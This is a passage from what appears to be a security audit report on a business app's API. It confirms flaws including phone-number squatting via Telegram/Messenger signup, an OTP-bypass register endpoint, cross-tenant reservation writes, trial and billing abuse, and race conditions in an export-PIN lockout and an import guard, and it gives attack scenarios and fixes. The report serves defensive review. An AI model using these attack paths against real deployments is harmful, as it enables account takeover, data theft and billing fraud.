**Description:** The web registration path enforces an SMS OTP (AuthController verify-phone-and-register / request-phone-verification). The channel signup path does not. TelegramSignupHandler.HandlePhoneAsync (lines 110-134) and MessengerSignupHandler.HandlePhoneAsync (lines 101-121) take message.Text as the phone, run only NormalizePhone, and call CompleteTelegram/MessengerSignupAsync, which create a Business + an Owner User with that phone and no further proof of ownership (AuthService.cs:369-408, 491-528). The created User defaults to IsActive=true (User.cs:12). The Messenger code comment (AuthService.cs:467-471) openly acknowledges the phone is 'user-typed and trusted', but the Telegram code comment (AuthService.cs:312-313) falsely claims the phone is 'proven via Telegram's verified contact-share' — no request_contact/contact-share is ever used; it is plain typed text. Because WhatsAppService resolves every inbound WhatsApp sender to a user purely by PhoneNumber == phone && IsActive (WhatsAppService.cs:331), an attacker who registers a victim's number via this flow makes their own tenant the owner of that phone.

**Attack scenario:** Attacker opens signup-via-telegram/start, taps the deep link, and when prompted types the victim's phone number. An Owner account for the victim's number is created inside the attacker's business; the attacker completes it via the post-signup magic link (delivered into the attacker's own chat) and controls the dashboard. The victim can no longer self-register (phoneExists throws 'already registered'), and when the victim later messages the WhatsApp bot from their real number, WhatsAppService.cs:331 matches the attacker-created active user — routing the victim's WhatsApp-entered sales/inventory into the attacker's tenant and exposing them to the attacker. Secondarily, unlimited free-trial accounts can be farmed with arbitrary fake numbers.

**Preconditions:** Attacker completes the anonymous signup-via-Telegram/Messenger flow (rate-limited only at token mint) and types a phone number they do not own — e.g. a victim's number, which is commonly known. For the WhatsApp-hijack impact the victim must not already have an account.

**Impact:** Account/identity takeover across channels: an attacker binds a victim's phone to attacker-controlled tenant, intercepts the victim's future WhatsApp business data, and denies the victim registration. Also enables trial-account farming.

**Evidence:** TelegramSignupHandler.cs:110-134 (typed text -> NormalizePhone, no OTP); MessengerSignupHandler.cs:101-121 (same); AuthService.cs:312-313 (false 'verified contact-share' claim); AuthService.cs:374-408 and 495-528 (create Owner with unverified phone); User.cs:12 (IsActive defaults true); WhatsAppService.cs:331 (sender resolved by PhoneNumber && IsActive).

**Recommended fix:** Require phone-ownership proof before CompleteTelegram/MessengerSignupAsync creates an account: either send the same SMS OTP the web path uses, or (Telegram) actually use request_contact and verify contact.user_id == sender before trusting the number. Do not create an IsActive Owner from an unverified phone. Fix the misleading AuthService.cs comment.

**Verification:** Verified every load-bearing claim against the source. The channel-native signup path creates active Owner accounts from an unverified, user-typed phone with no OTP, while the web path (AuthController.cs:305 -> RegisterOwnerAsync) is OTP-gated (PhoneVerificationService). Confirmed:

- Reachable/anonymous: AuthController.cs:424 (signup-via-telegram/start) and :450 (signup-via-messenger/start) are [AllowAnonymous], rate-limited only at token mint.
- No verification in handlers: TelegramSignupHandler.cs:125-145 and MessengerSignupHandler.cs:112-132 take message.Text as the phone, run only WhatsAppService.NormalizePhone, then call CompleteTelegram/MessengerSignupAsync. No OTP, no contact-share check.
- Active Owner from unverified phone: AuthService.cs:397-408 and :518-528 create User{Role=Owner, MustChangePassword=true}; IsActive defaults true (User.cs:12). Business created with 30-day trial.
- False security comment: AuthService.cs:312 claims phone is "proven via Telegram's verified contact-share" and AuthController.cs:422 says "captures phone via request_contact," but grepping the entire Telegram channel folder shows NO request_contact / contact.user_id handling exists — the handler purely trusts typed text. The Messenger comment (AuthService.cs:469-470) honestly admits the phone is "user-typed and trusted."
- Cross-channel hijack vector real: WhatsAppService.cs:329-331 resolves inbound WhatsApp senders solely by PhoneNumber == phone && u.IsActive && u.Business.IsActive; unknown numbers go to onboarding. So an attacker-created active user carrying the victim's number captures the victim's future WhatsApp sales/inventory into the attacker's tenant, and the attacker owns the dashboard via the post-signup magic link delivered to the attacker's own chat.

Checked the guard the finder could have missed: the phoneExists check (AuthService.cs:374-376, :495-497) blocks squatting a number that already has an ACTIVE user — which is precisely why the finding scopes the WhatsApp-hijack impact to victims without an existing account. The deactivated-user swap does not obstruct the attack. No unstated blocker refutes it.

Only caveat is feature configuration (Telegram:BotUsername / Messenger:PageUsername must be set), but the path is fully built, wired, and anonymous; this is a deployment gate, not a logic blocker. Given the WhatsApp-heavy product, a squatted owner reaching the WhatsApp bot and leaking data cross-tenant is realistic. This is a genuine authentication/identity-verification failure (CWE-345/A07). Severity High confirmed: reliable trial farming + registration DoS on any un-registered number, plus a credible cross-tenant data-interception/identity-binding takeover.

---

## F06 · [Medium] Plain /api/auth/register bypasses the mandatory phone-OTP signup gate (unverified-phone account creation / squatting)
- **Domain:** auth-session · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-287
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** Authentication - registration
- **Files:** /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Controllers/AuthController.cs, /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Services/AuthService.cs, /Users/kendennis/Desktop/Ojunai-AI/dashboard/src/app/register/page.tsx

**Description:** The real signup flow proves phone ownership: the dashboard register page (register/page.tsx:10,173) calls requestPhoneVerification + verifyPhoneAndRegister, which forces a WhatsApp OTP (AuthController.cs:266-318) before AuthService.RegisterOwnerAsync runs. But the legacy [AllowAnonymous] POST /api/auth/register (AuthController.cs:57-65) calls RegisterOwnerAsync directly (AuthService.cs:43-108) with NO OTP and NO ownership proof of the supplied phone number. It only checks that the phone/email is not already registered, then creates the Business+User as Owner and returns a live session cookie.

**Attack scenario:** Attacker POSTs /api/auth/register with an arbitrary victim phone number they do not control (any number not already in the system) plus their own password. An account+business is created bound to that phone and the attacker is logged in immediately. This defeats the OTP control the UI enforces.

**Preconditions:** The target phone number must not already be registered. No authentication required.

**Impact:** Phone-number squatting / pre-registration: a legitimate owner can be permanently blocked from registering their own number ('Phone number already registered'), and the squatted number is what later receives password-reset OTPs (PhoneVerificationService.PasswordReset). Mass automated account/business creation for spam or resource exhaustion. Also a direct existence-enumeration oracle via the 'already registered' error.

**Evidence:** AuthController.cs:59-65 Register() -> _auth.RegisterOwnerAsync(request) with only [AuthRateLimit]; RegisterOwnerAsync (AuthService.cs:49-107) normalizes the phone and only calls AnyAsync(...IsActive) uniqueness checks — no PhoneVerificationService involvement. Dashboard uses verifyPhoneAndRegister (register/page.tsx:173), so /register is an exposed weaker parallel path.

**Recommended fix:** Remove/disable the direct /api/auth/register endpoint (and the register() helper in dashboard/src/lib/auth.ts) so all web signups must go through request-phone-verification + verify-phone-and-register, or gate /register behind the same ConsumeCodeAsync OTP check.

**Verification:** Verified directly against source. AuthController.Register() (AuthController.cs:57-65) carries [AllowAnonymous], which overrides the class-level [Authorize] on OjunaiBaseController, and is mapped via app.MapControllers() with no environment or feature gating — so it is a live, unauthenticated endpoint in production. It calls _auth.RegisterOwnerAsync(request) directly and issues a session cookie. RegisterOwnerAsync (AuthService.cs:43-108) performs only password-policy validation, phone normalization, and IsActive uniqueness checks on phone/email; there is no IPhoneVerificationService/ConsumeCodeAsync call anywhere in this path, i.e. no proof of phone ownership. By contrast, the OTP-gated endpoint verify-phone-and-register (AuthController.cs:285-318) calls _phoneVerify.ConsumeCodeAsync before RegisterOwnerAsync, and the dashboard register/page.tsx exclusively uses that OTP flow. This confirms the direct /api/auth/register is an exposed weaker parallel path that bypasses the mandatory phone-OTP signup gate. An unauthenticated attacker can POST an arbitrary (not-yet-registered) phone number plus their own password and get an account+business bound to that number with an immediate live session — no ownership proof. Real impacts: unverified-phone account creation, phone-number squatting / registration-DoS on a targeted number, mass/spam account+business creation (throttled only by [AuthRateLimit] per IP), and an existence-enumeration oracle from the distinct 'Phone number already registered' / 'Email already registered' errors.

---

## F07 · [Medium] Voice-AI reservation status/sell endpoints forward caller-supplied reservationId to a NON-tenant-scoped admin route (cross-tenant write)
- **Domain:** authz-tenant · **Verdict:** CONFIRMED · **New since audit #1:** False
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP:** A01:2021 Broken Access Control
- **Component:** BusinessController — Voice AI reservations proxy
- **Files:** Ojunai.API/Controllers/BusinessController.cs

**Description:** The GET reservations proxy is correctly scoped: it calls the Voice AI admin API at /api/admin/businesses/{business.VoiceAIBusinessId}/reservations, so a merchant only sees their own reservations. However, the two STATE-CHANGING endpoints — PATCH voice-ai-reservations/{reservationId}/status and POST voice-ai-reservations/{reservationId}/sell — take the reservationId straight from the caller's route and forward it to the GLOBAL, non-business-scoped admin route /api/admin/reservations/{reservationId}/status (BusinessController.cs:883 and :942) with the shared X-Admin-Key. Neither endpoint verifies that the reservation actually belongs to the caller's VoiceAIBusinessId before mutating it. This is a worse variant of the known reservation read-IDOR: it is a cross-tenant WRITE (mark another tenant's reservation cancelled/fulfilled/expired) rather than a read, and the isolation relies entirely on the downstream Voice AI service happening to scope by business — which the status route path does not encode.

**Attack scenario:** A merchant with Voice AI enabled (any user with ManageStock for status, or RecordSales for sell) obtains a reservationId belonging to another Voice-AI tenant and issues PATCH /api/business/voice-ai-reservations/{foreignReservationId}/status {"status":"cancelled"}. The main API validates only that the CALLER has Voice AI access (VoiceAIGuard.HasAccess on the caller's own business), then relays the mutation to /api/admin/reservations/{foreignReservationId}/status with the admin key, cancelling/fulfilling the victim tenant's reservation. The /sell path additionally marks any reservation 'fulfilled'.

**Preconditions:** Caller has Voice AI enabled and possesses/guesses a valid foreign reservation GUID. Reservation IDs are v4 GUIDs and are only returned to their owning tenant, so they are not enumerable — this bounds practical exploitability but the authorization check is genuinely absent.

**Impact:** Cross-tenant tampering with another business's Voice AI reservations (cancel/fulfil/expire), i.e. integrity loss / targeted denial of a competitor's held stock, if a reservation ID leaks.

**Evidence:** BusinessController.cs:854-912 (UpdateVoiceAIReservationStatus) builds PATCH to "/api/admin/reservations/{reservationId}/status" (line 883) after only checking VoiceAIGuard.HasAccess(business) for the CALLER's business — reservationId ownership is never checked. BusinessController.cs:914-978 (SellVoiceAIReservation) does the same at line 942. Contrast the GET at line 783 which scopes via business.VoiceAIBusinessId.

**Recommended fix:** Before relaying, fetch the reservation from the Voice AI admin API scoped to business.VoiceAIBusinessId (or pass VoiceAIBusinessId in the mutation path/body) and reject if the reservation's owning business does not match the caller's VoiceAIBusinessId. Do not use a global /api/admin/reservations/{id} route for tenant-initiated mutations.

**Verification:** Verified against BusinessController.cs. The GET proxy (line 783) scopes reservations to the caller's tenant via /api/admin/businesses/{business.VoiceAIBusinessId}/reservations. In contrast, UpdateVoiceAIReservationStatus (lines 854-912) forwards the caller-supplied reservationId to the GLOBAL, non-business-scoped route /api/admin/reservations/{reservationId}/status (line 883), and SellVoiceAIReservation (lines 914-978) does the same at line 942. Both only check VoiceAIGuard.HasAccess(business) for the CALLER's own business plus RequirePermission (ManageStock / RecordSales); neither verifies that reservationId belongs to business.VoiceAIBusinessId before mutating. The tenant's VoiceAIBusinessId is held in memory but is never used to constrain the write path, and the shared X-Admin-Key is attached. The downstream Voice AI service is a separate service not present in this repo, so I cannot inspect its scoping directly — but the route path itself encodes no business (unlike the deliberately business-scoped GET path in the same file), and the admin-key-only authorization pattern strongly indicates the downstream route trusts the caller entirely. The asymmetry between the scoped GET and unscoped writes is decisive evidence the ownership check was simply omitted on the mutations. This is an authorization-bypass-through-user-controlled-key (CWE-639) cross-tenant WRITE: a merchant with a leaked foreign reservation GUID can cancel/fulfil/expire another tenant's Voice AI reservation.

---

## F08 · [Medium] Unlimited repeatable higher-tier trials — pay Starter/Lite, get Pro features perpetually
- **Domain:** business-logic · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-841 Improper Enforcement of Behavioral Workflow
- **OWASP:** A04:2021 Insecure Design
- **Component:** PlanGuard (trial lifecycle)
- **Files:** Ojunai.API/Common/PlanGuard.cs, Ojunai.API/Controllers/BusinessController.cs, Ojunai.API/Models/Business.cs

**Description:** There is no record anywhere that a business has already consumed a trial. Business.cs tracks only TrialEndsAt/SubscribedPlan (no HasUsedTrial/TrialCount flag — confirmed by grep). CanStartTrialAsync (PlanGuard.cs:126-150) blocks a new trial ONLY while the current trial is Active or GracePeriod; once a trial reaches Expired and the background job RevertExpiredTrialsAsync (PlanGuard.cs:164-184) reverts Plan back to SubscribedPlan and sets TrialEndsAt=null, GetTrialStatus returns None again and a brand-new 30-day trial of the same (or any eligible higher) tier can be started immediately. For any tier above Starter the only precondition is IsSubscriber==true (SubscribedPlan not empty), which is satisfied by the cheapest paid tier.

**Attack scenario:** A merchant subscribes to the cheapest paid tier (Lite, 12,500). They POST /api/business/start-trial {plan:"pro"}. CanStartTrialAsync: pro is TrialEligible, current TrialStatus None, targetRank(pro)=3>starter, IsSubscriber true, PlanRank(lite)=1>=0 -> allowed. StartTrialAsync sets Plan="pro", TrialEndsAt=now+30 (PlanGuard.cs:152-160). They now get full Pro entitlements (GetEffectivePlanAsync returns PlanLimits.Get(business.Plan)="pro") for 30 days for free. After expiry+grace the revert job restores Plan="lite"; they immediately call start-trial {plan:"pro"} again. Repeat indefinitely — perpetual Pro (72,500 value) while paying Lite.

**Preconditions:** Attacker holds an active paid subscription at any tier >= Starter (needed to satisfy IsSubscriber) and ManageSettings permission (Owner/Admin). Each cycle requires waiting out the ~33-day trial+grace window; the abuse is unbounded but time-gated per cycle.

**Impact:** Recurring revenue leakage: the top trial-eligible tier (Pro) can be obtained perpetually while paying only the cheapest paid tier.

**Evidence:** PlanGuard.cs:135-136 blocks only Active/GracePeriod; lines 143-149 gate higher tiers solely on IsSubscriber + SubscribedPlan rank; StartTrialAsync (152-162) sets Plan to target with no trial-consumption record. Business.cs has no trial-used field (grep for HasUsedTrial/TrialCount returned nothing). GetEffectivePlanAsync (255-261) derives features purely from business.Plan, which the trial elevates.

**Recommended fix:** Persist a per-business/per-plan trial-consumption record (e.g. Business.HasUsedTrial or a TrialHistory table) and reject StartTrialAsync when a trial for that tier (or any tier) has already been consumed, regardless of current TrialStatus. Do not rely on the transient TrialEndsAt/GetTrialStatus window as the sole re-trial guard.

**Verification:** Verified all three cited files. The vulnerability is real and exploitable as described. (1) Business.cs (lines 1-127) has no trial-consumption field — only TrialEndsAt/SubscribedPlan; grep across Ojunai.API for HasUsedTrial/TrialCount/TrialHistory/TrialUsed returns nothing, confirming the finder's claim. (2) CanStartTrialAsync (PlanGuard.cs:134-136) rejects a re-trial ONLY while status is Active or GracePeriod; once Expired (or after RevertExpiredTrialsAsync at 164-184 nulls TrialEndsAt → status None) the guard passes. The higher-tier gate (138-149) requires only IsSubscriber==true and SubscribedPlan rank ≥ starter, both satisfied by the cheapest paid tier. (3) StartTrialAsync (152-162) sets business.Plan to the target tier with no consumption record while leaving SubscribedPlan (which drives billing) unchanged; GetEffectivePlanAsync (255-261) returns PlanLimits.Get(business.Plan), so entitlements elevate to the trial tier. (4) The endpoint POST /api/business/start-trial (BusinessController.cs:145-153) is gated only by RequirePermission(ManageSettings) — the merchant's own Owner/Admin, matching the stated preconditions. Full attack trace for a Lite subscriber holds: status None → passes → targetRank(pro)=3>0 → IsSubscriber true → PlanRank(lite)=1≥0 → allowed → Plan=pro for 30 days free; reverts to Lite after grace; repeat. No unstated blocker. Severity Medium is correct: it is self-abuse (no cross-tenant impact) and throttled to ~33 days per cycle, but produces unbounded recurring revenue leakage of the top trial-eligible tier while paying the cheapest.

---

## F09 · [Medium] change-plan 'downgrade' guard keys off trial-inflated effective Plan, allowing free upgrade of the paid tier
- **Domain:** business-logic · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-639 Authorization Bypass Through User-Controlled Key / business-logic flaw
- **OWASP:** A04:2021 Insecure Design
- **Component:** SubscriptionController.ChangePlan
- **Files:** Ojunai.API/Controllers/SubscriptionController.cs, Ojunai.API/Common/PlanGuard.cs

**Description:** ChangePlan (SubscriptionController.cs:415-453) computes currentRank = PlanGuard.PlanRank(business.Plan) at line 427 and only accepts targetRank < currentRank ('downgrades only', line 433-434). But business.Plan is the EFFECTIVE plan, which StartTrialAsync elevates to the trial tier while the paid SubscribedPlan stays lower. The endpoint then writes business.SubscribedPlan = targetPlan (line 447, or via PendingPlanChange at 440 which RevertExpiredTrialsAsync later commits to SubscribedPlan at PlanGuard.cs:196-203) with no payment. Because the guard compares against the inflated Plan, a merchant can set SubscribedPlan to any tier strictly between their real paid tier and their active trial tier — i.e. buy a cheap tier, and permanently 'downgrade' into a more expensive tier for free.

**Attack scenario:** Merchant pays Lite (SubscribedPlan="lite", rank 1) and starts a Pro trial (Plan="pro", rank 3). They POST /api/subscription/change-plan {plan:"operator"} (rank 2). currentRank=PlanRank("pro")=3, targetRank=2 -> passes the targetRank<currentRank 'downgrade' check. The handler sets SubscribedPlan="operator" immediately (line 446-450) when no future SubscriptionEndsAt exists, or schedules PendingPlanChange="operator" (line 440) which the revert job commits to SubscribedPlan later. Operator (29,999) now becomes the locked-in paid plan though only Lite (12,500) was ever paid.

**Preconditions:** Merchant has an active trial that elevated business.Plan above their paid SubscribedPlan (reachable via the trial flow), plus ManageSettings permission. Immediate-apply requires no active future SubscriptionEndsAt; otherwise the upgrade lands via the deferred PendingPlanChange path.

**Impact:** Paid subscription tier (SubscribedPlan) can be raised one or more tiers without payment, a direct billing/entitlement bypass.

**Evidence:** SubscriptionController.cs:427 currentRank = PlanGuard.PlanRank(business.Plan) (effective/trial plan, not SubscribedPlan); 433-434 enforces downgrade using that rank; 446-450 sets business.Plan and business.SubscribedPlan = targetPlan with no charge; deferred branch 438-443 sets PendingPlanChange, later applied to SubscribedPlan at PlanGuard.cs:196-203. StartTrialAsync (PlanGuard.cs:158) is what makes business.Plan outrank SubscribedPlan.

**Recommended fix:** Base the downgrade/upgrade rank comparison in ChangePlan on the actually-paid tier (business.SubscribedPlan), not the effective business.Plan, and reject any change whose target outranks the paid SubscribedPlan. Never assign SubscribedPlan to a higher tier without a corresponding verified payment.

**Verification:** Verified against source. ChangePlan (SubscriptionController.cs:427) computes currentRank from business.Plan — the effective/trial plan — not the paid SubscribedPlan, and the only gate (lines 430-434) rejects targetRank >= currentRank, accepting anything strictly below. StartTrialAsync (PlanGuard.cs:158) elevates business.Plan to the trial tier while SubscribedPlan stays at the paid tier, and the start-trial endpoint (BusinessController.cs:145) is a merchant-callable path whose CanStartTrialAsync only requires the caller to already be a subscriber (PlanGuard.cs:143-147). Confirmed ranks via PlanOrder (PlanGuard.cs:38): starter0/lite1/operator2/pro3/scale4, and prices via PlanLimits (lite 12500, operator 29999, pro 72500), so the operator target passes the PricePerMonth>0 check at line 424. Attack: pay Lite (SubscribedPlan=lite, rank1) → start Pro trial (Plan=pro, rank3) → change-plan to operator (rank2): currentRank=3, targetRank=2 passes the 'downgrade' check, and the handler writes SubscribedPlan=operator either immediately (line 447) or via PendingPlanChange (line 440) which RevertExpiredTrialsAsync commits to SubscribedPlan (PlanGuard.cs:199) for manual accounts. No payment is charged on this endpoint and no comparison against SubscribedPlan exists. After trial expiry RevertExpiredTrialsAsync sets Plan=SubscribedPlan=operator (line 179), so operator-tier entitlements (feature gating uses business.Plan via GetEffectivePlanAsync) persist permanently while only Lite was paid. No unstated blocker found; both apply branches reach the elevated SubscribedPlan. Real billing/entitlement bypass.

---

## F10 · [Medium] Export PIN per-token lockout is bypassable via a concurrency race (non-atomic read-modify-write)
- **Domain:** files-import-export · **Verdict:** CONFIRMED · **New since audit #1:** False
- **CWE:** CWE-362
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** ExportController.DownloadWithPin
- **Files:** Ojunai.API/Controllers/ExportController.cs

**Description:** The per-token lockout counter is the control the code itself calls 'the decisive control' (comment lines 42-46) because the per-IP [AuthRateLimit] is defeated by IP rotation. But the counter update is a non-atomic read-modify-write on a plain ConcurrentDictionary: line 73 reads `entry = _pinAttempts.GetValueOrDefault(tkey)`, and on a wrong PIN line 99 writes `_pinAttempts[tkey] = (entry.Count + 1, start)`. There is no lock, no AddOrUpdate, and no compare-and-swap. Concurrent requests for the same token all read the same stale Count and all write Count+1, so a burst of N parallel guesses advances the counter by only 1 while testing N PINs. An attacker can therefore test thousands of PINs per 'increment', reaching the full 10^4 space in a handful of bursts before Count ever reaches MaxPinAttempts (5). This makes the lockout — and thus the whole brute-force defense for a leaked link — ineffective.

**Attack scenario:** Hold a leaked token. Fire, say, 2000 concurrent POST /api/export/download requests each with a distinct PIN guess. All read Count=0 and write 1; the correct guess in the batch succeeds and returns the financial-report PDF. Repeat batches (each only nudges the counter by ~1) until the PIN is found.

**Preconditions:** Attacker holds a leaked but still-valid signed download link (query-string tokens leak via proxy logs, Referer, chat forwards — the exact threat the lockout was added to defend). The PIN is only 4 digits, DerivePin() returns acctLast2+yearLast2 or the account-number's last 4 (≤10^4, often far less entropy).

**Impact:** Brute-force of the 4-digit PIN on a leaked link, yielding unauthorized download of a business's financial reports (sales/expenses/P&L/inventory) — confidential cross-tenant data disclosure.

**Evidence:** ExportController.cs:73 `var entry = _pinAttempts.GetValueOrDefault(tkey);`; :96-100 non-atomic `_pinAttempts[tkey] = (entry.Count + 1, start);`; MaxPinAttempts=5 at :48; low-entropy PIN in DerivePin at :130-137.

**Recommended fix:** Make the increment atomic: use _pinAttempts.AddOrUpdate with the window-reset logic inside the update delegate, or a per-token lock. Better, persist the attempt counter server-side (DB/Redis) keyed by token so it survives process restarts and multiple instances, and consider a one-time-use token or higher-entropy PIN.

**Verification:** The finding is accurate and exploitable as described. In ExportController.cs the per-token lockout is a genuine non-atomic read-check-write: line 73 reads `entry` from a plain ConcurrentDictionary via GetValueOrDefault, line 79 checks `entry.Count >= MaxPinAttempts (5)` against that stale value, and line 99 writes `_pinAttempts[tkey] = (entry.Count + 1, start)` — no lock, no AddOrUpdate, no CAS. Concurrent requests for the same token all read the same Count and all write Count+1, so a large concurrent burst advances the counter by only ~1 while testing N distinct PINs (a lost-update / TOCTOU race). MaxPinAttempts=5 (line 48) is confirmed and, per the code's own comment (lines 42-46), is the decisive brute-force control because without it an attacker legitimately gets only 5 guesses per 15-min window — nowhere near the ~10^4 PIN space. DerivePin (lines 130-137) confirms the low entropy: acctLast2+yearLast2 or last-4 of account, ≤10^4 (and less in practice since birth-year last-two clusters). I checked the two candidate blockers: (1) [AuthRateLimit] is strictly per-IP (AuthRateLimitFilter.cs: 10 attempts / 5 min, keyed on RemoteIpAddress), so an IP-rotated proxy pool defeats it and can supply the concurrency the race needs — exactly the finding's stated caveat; it even shares the same racy pattern. (2) Token lifetime is 24h by default (ExportTokenHelper.cs:13) and the sole caller WhatsAppService.cs:3060 uses that default, giving a wide attack window on a leaked query-string token. No unstated guard blocks the attack.

---

## F11 · [Medium] Import duplicate-guard is bypassable by a concurrent double-submit (check-then-insert TOCTOU, no unique constraint)
- **Domain:** files-import-export · **Verdict:** CONFIRMED · **New since audit #1:** False
- **CWE:** CWE-362
- **OWASP:** A04:2021 Insecure Design
- **Component:** ImportController.EnqueueImportAsync
- **Files:** Ojunai.API/Controllers/ImportController.cs

**Description:** The idempotency guard (added to stop double-counting appended sales/expenses/ledger rows) does a SELECT (`_db.ImportJobs.AnyAsync(...)`, line 167) and, if no match, an INSERT (line 192). This check-then-act is not atomic and there is no supporting unique index on ImportJobs (BusinessId, Type, FileName, TotalRows, ImportMode). Two concurrent identical submissions both execute AnyAsync before either commits its Queued row, both see no duplicate, both insert, and both enqueue a Hangfire worker. The workers then each append the full set of sales/expense/ledger rows, producing exactly the double-count the guard was meant to prevent. The guard only defends against sequential resubmits.

**Attack scenario:** Double-click the Import button (or a client retry) so two POST /api/import/sales requests with the same file run concurrently. Both pass the AnyAsync check and enqueue; the sales rows are imported twice, doubling revenue/receivables. No malicious intent needed — this is an integrity bug triggerable in normal use.

**Preconditions:** Two (or more) identical import requests arrive nearly simultaneously — the exact 'accidental double-submit / client retry' scenario the guard was built to stop. A double-click that fires two XHRs, or a client auto-retry on slow response, reliably produces this.

**Impact:** Silent double-counting of financial records (sales, expenses, ledger/debts) on concurrent submit — corrupted revenue, COGS, and outstanding-balance figures. Requires the merchant to notice and manually roll back one batch.

**Evidence:** ImportController.cs:167-175 AnyAsync duplicate check; :192-193 Add + SaveChanges; no HasIndex/unique constraint exists for ImportJobs (confirmed: no index definitions found in Data layer / model ImportJob.cs). The worker appends rows without dedup (ImportJobService ProcessSalesRowsAsync adds a new Sale per row).

**Recommended fix:** Add a DB unique index / idempotency key covering the identifying fields (e.g. a content hash of RawCsvText + Type + Mode + BusinessId within the recency window) and rely on a unique-constraint violation to reject the duplicate, or take a transactional advisory lock per (BusinessId, hash) around the check+insert. Client-side single-submit guarding is insufficient.

**Verification:** The finding is accurate on every load-bearing claim. (1) ImportController.EnqueueImportAsync performs a non-atomic check-then-insert: AnyAsync duplicate check at lines 167-175, then Add + SaveChangesAsync at lines 192-193. (2) I verified AppDbContext.cs:382-392: ImportJob has only two NON-unique indexes (BusinessId+CreatedAtUtc, and Status) — there is no unique constraint on the identifying fields (BusinessId, Type, FileName, TotalRows, ImportMode). Tellingly, the adjacent PendingAction entity (line 398) uses .IsUnique(), confirming the pattern was available but deliberately not applied to ImportJob. (3) The worker ImportJobService.ProcessSalesRowsAsync creates a fresh Sale per row (lines 495-514) plus LedgerEntry/InventoryTransaction, each stamped with its own job.Id as ImportBatchId — no data-level dedup, so two jobs produce two full batches. (4) No mitigating blocker exists: Program.cs:37 uses AddDbContext (request-scoped, not pooled), so two concurrent requests have separate change trackers; there is no wrapping transaction or DB advisory lock around the check+insert. Under default Read Committed isolation, request B's AnyAsync cannot see request A's uncommitted Queued row, so both submissions pass the guard, both insert, and both enqueue a Hangfire worker — reproducing exactly the double-count the guard was meant to prevent. The preconditions (double-click firing two XHRs, or a client auto-retry) are realistic and are the precise scenario the guard targets. Severity remains Medium: this is a financial-data integrity race, not an auth bypass; it requires concurrency timing; and it is recoverable via the Rollback endpoint (line 90), though only after the merchant notices the double-count. Medium is appropriate.

---

## F12 · [Medium] TOCTOU race in export-PIN per-token lockout allows brute-forcing the 4-digit PIN
- **Domain:** fix-regression · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** ExportController PDF download PIN gate
- **Files:** Ojunai.API/Controllers/ExportController.cs

**Description:** The per-token PIN attempt lockout added in ExportController.cs uses a ConcurrentDictionary but performs a non-atomic read-modify-write: it reads the counter with _pinAttempts.GetValueOrDefault(tkey) (line 95 in diff), checks entry.Count >= MaxPinAttempts, and on a wrong PIN writes _pinAttempts[tkey] = (entry.Count + 1, start) via a plain indexer set (ExportController.cs:98-99). Concurrent requests for the same token all read the same Count, all pass the '>= 5' gate, and the last-writer-wins store increments the counter by only 1 per concurrent burst instead of per attempt. The fix's own comment declares this per-token counter 'the decisive control' because the per-IP [AuthRateLimit] is bypassable by IP rotation. The race removes that cross-IP backstop: with a leaked token (the comment acknowledges tokens leak via proxy logs / chat forwards / Referer) plus a proxy pool, an attacker can fire concurrent bursts that far exceed 5 attempts before the counter reflects them, covering the ~10^4 space (PIN = accountNumber last2 + birth-year last2, ExportController.cs:130-137) and obtaining the tenant's financial PDF.

**Attack scenario:** Attacker obtains a leaked download token, then from a rotating proxy pool submits many concurrent POST /api/export/download requests with different pin guesses. Because each concurrent request reads the same stale entry.Count and the counter is overwritten (not atomically incremented), the per-token lockout never reaches 5 fast enough; the per-IP AuthRateLimit (10/5min) is sidestepped by IP rotation. All 10,000 PINs are testable within a small number of windows.

**Preconditions:** Attacker holds a valid (leaked) export token and can send concurrent requests from multiple IPs.

**Impact:** Brute-force recovery of the 4-digit download PIN, yielding the tenant's financial report PDF (sales/expenses/inventory/P&L).

**Evidence:** ExportController.cs:95 `var entry = _pinAttempts.GetValueOrDefault(tkey);`, line 101 `if (entry.Count >= MaxPinAttempts) return ...`, lines 98-99 `var start = entry.Count == 0 ? now : entry.WindowStart; _pinAttempts[tkey] = (entry.Count + 1, start);` — a check-then-set with no AddOrUpdate/atomicity. MaxPinAttempts=5 (diff line 73). PIN entropy is 4 digits (DerivePin, ExportController.cs:130-137).

**Recommended fix:** Make the increment atomic: use _pinAttempts.AddOrUpdate(tkey, ...) with the window logic inside the update delegate, and re-read the resulting Count to decide lockout — or take a per-token lock. Consider persisting attempt counts (or invalidating the token) so the cap survives process restarts and multiple instances, since an in-process counter is also per-instance.

**Verification:** The vulnerable pattern exists exactly as described. ExportController.cs performs a non-atomic read-modify-write on the per-token lockout counter: read at line 73 (`GetValueOrDefault`), check at line 79 (`entry.Count >= MaxPinAttempts`), and plain indexer write at line 99 (`_pinAttempts[tkey] = (entry.Count + 1, start)`). ConcurrentDictionary guarantees per-operation thread safety but NOT atomicity across this compound sequence, so concurrent requests reading the same stale Count all pass the gate and overwrite (last-writer-wins), advancing the counter by ~1 per burst instead of per attempt. This is a textbook lost-update/TOCTOU race (CWE-367).\n\nExploitability is real and, if anything, easier than the finder states: between the read (line 73) and the write (line 99) sits an `await _db.Users...FirstOrDefaultAsync` DB round trip (lines 82-84), which widens the race window and lets many concurrent requests park after reading Count=0. I checked for compensating controls and found none: (1) the per-IP AuthRateLimitFilter is keyed purely on RemoteIpAddress (10/5min) and is genuinely bypassable by IP rotation — the code comment explicitly names this per-token counter the decisive backstop; (2) tokens are stateless HMAC (ExportTokenHelper), NOT single-use, valid 24h (line 13), and failed PIN attempts do not invalidate them, so brute-force replay is permitted; (3) there is no account lockout or other global cap. The PIN is confirmed 4 digits (DerivePin, lines 130-137, 10^4 space). Without the race a leaked token yields ~480 attempts over 24h (~5%); the race removes the per-token cap so concurrent bursts can cover the full space (~100%). Preconditions (a leaked query-string token + proxy pool) are realistic and acknowledged by the code's own comment. Medium severity is correct: it defeats the stated decisive control, but requires a leaked-token precondition and yields disclosure of a single tenant's financial report PDF.

---

